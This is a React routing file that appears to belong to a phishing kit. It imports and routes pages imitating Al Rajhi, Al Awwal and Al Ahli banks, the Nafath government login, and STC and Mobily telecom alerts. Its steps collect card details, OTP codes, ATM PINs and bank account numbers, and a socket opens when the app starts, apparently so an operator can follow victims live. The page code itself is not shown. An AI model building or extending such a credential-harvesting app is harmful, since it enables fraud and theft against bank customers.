import { useEffect } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { initializeSocket, disconnectSocket } from "./lib/store";

// Existing Pages
import Home from "./pages/Home";
import HomeNew from "./pages/HomeNew";
import Login from "./pages/Login";
import NafathLogin from "./pages/NafathLogin";
import UpdateInfo from "./pages/UpdateInfo";
import SummaryPayment from "./pages/SummaryPayment";

// Payment Pages
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";

// Phone Verification Pages
import PhoneVerification from "./pages/PhoneVerification";
import PhoneOTP from "./pages/PhoneOTP";
import STCCallAlert from "./pages/STCCallAlert";
import MobilyCallAlert from "./pages/MobilyCallAlert";
import MyStcOTP from "./pages/MyStcOTP";

// Nafath Pages
import NafathLoginPage from "./pages/NafathLoginPage";
import NafathVerify from "./pages/NafathVerify";

// Al Rajhi Bank Pages
import AlRajhiLogin from "./pages/AlRajhiLogin";
import AlRajhiOTP from "./pages/AlRajhiOTP";
import AlRajhiNafath from "./pages/AlRajhiNafath";
import AlRajhiAlert from "./pages/AlRajhiAlert";
import AlRajhiCall from "./pages/AlRajhiCall";
import RajhiPaymentError from "./pages/RajhiPaymentError";

// Al Awwal Bank Pages
import AlAwwalBank from "./pages/AlAwwalBank";
import AlAwwalNafath from "./pages/AlAwwalNafath";

// Al Ahli Bank Pages
import AlAhliOTP from "./pages/AlAhliOTP";

// Bank Transfer Pages
import BankTransfer from "./pages/BankTransfer";
import BankAccountNumber from "./pages/BankAccountNumber";

// Final Page
import FinalPage from "./pages/FinalPage";

function Router() {
  return (
    <Switch>
      {/* Existing Routes */}
      <Route path={"/"} component={HomeNew} />
      <Route path={"/login"} component={Login} />
      <Route path={"/nafath-login"} component={NafathLogin} />
      <Route path={"/update-info"} component={UpdateInfo} />
      <Route path={"/summary-payment"} component={SummaryPayment} />
      <Route path={"/service/:id?"} component={Home} />

      {/* Payment Routes */}
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />

      {/* Phone Verification Routes */}
      <Route path={"/phone-verification"} component={PhoneVerification} />
      <Route path={"/phone-otp"} component={PhoneOTP} />
      <Route path={"/stc-call-alert"} component={STCCallAlert} />
      <Route path={"/mobily-call-alert"} component={MobilyCallAlert} />
      <Route path={"/mystc-otp"} component={MyStcOTP} />

      {/* Nafath Routes */}
      <Route path={"/nafath-login-page"} component={NafathLoginPage} />
      <Route path={"/nafath-verify"} component={NafathVerify} />

      {/* Al Rajhi Bank Routes */}
      <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
      <Route path={"/alrajhi-otp"} component={AlRajhiOTP} />
      <Route path={"/alrajhi-nafath"} component={AlRajhiNafath} />
      <Route path={"/alrajhi-alert"} component={AlRajhiAlert} />
      <Route path={"/alrajhi-call"} component={AlRajhiCall} />
      <Route path={"/rajhi-payment-error"} component={RajhiPaymentError} />

      {/* Al Awwal Bank Routes */}
      <Route path={"/alawwal-bank"} component={AlAwwalBank} />
      <Route path={"/alawwal-nafath"} component={AlAwwalNafath} />

      {/* Al Ahli Bank Routes */}
      <Route path={"/alahli-otp"} component={AlAhliOTP} />

      {/* Bank Transfer Routes */}
      <Route path={"/bank-transfer"} component={BankTransfer} />
      <Route path={"/bank-account-number"} component={BankAccountNumber} />

      {/* Final Page */}
      <Route path={"/final-page"} component={FinalPage} />

      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  // Initialize socket on app mount
  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <TooltipProvider>
          <Toaster />
          <ScrollToTop />
          <PageTitleUpdater />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
